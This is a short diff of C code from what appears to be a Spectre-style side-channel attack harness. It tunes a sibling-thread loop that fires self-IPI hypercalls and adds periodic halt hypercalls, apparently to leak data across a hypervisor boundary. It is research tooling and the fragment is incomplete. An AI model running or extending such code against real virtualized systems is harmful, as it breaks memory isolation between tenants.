@@ -61,8 +61,13 @@ void half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
 	}
 }
 
-
 static void do_spectre_touch_base(int repeat) {
+	static int halt_counter = 1;
+	static int fd_halt = -1;
+	if (fd_halt == -1) {
+		fd_halt = open("/proc/hypercall/halt", O_WRONLY);
+		assert(fd_halt > 0);
+	}
 	static struct self_send_ipi_hypercall opts = {.min = 0, .repeat = 1};
 	static int fd = -1;
 	if (fd == -1) {
@@ -72,17 +77,24 @@ static void do_spectre_touch_base(int repeat) {
 
 	opts.repeat = repeat;
 	assert(write(fd, &opts, sizeof(opts)) != 1);
+
+	halt_counter -= repeat;
+	if (halt_counter <= 0) {
+		halt_counter = 700;
+		for (int r = 0; r < 2; r++)
+			assert(write(fd_halt, NULL, 0) == 0);
+	}
 }
 
 static void *spectre_touch_base(void *data)
 {
-	const int verbose = 1;
+	const int verbose = 2;
 	set_cpu_affinity(get_sibling(CPU));
 	if (verbose >= 1) printf("[sibling] starting spectre_touch_base\n");
 	static int triggers = 0;
 	uint64_t start = clock_read();
 	while (!sibling_stop) {
-		do_spectre_touch_base(1000);
+		do_spectre_touch_base(100);
 		triggers += 1000;
 		if (verbose >= 2) if (triggers % 100000 == 0) {
 			double duration = (clock_read() - start) / 1000000000.0;
@@ -107,4 +119,5 @@ void spectre_touch_base_stop(void)
 {
 	sibling_stop = 1;
 	assert(pthread_join(sibling, NULL) == 0);
+	sibling = -1;
 }
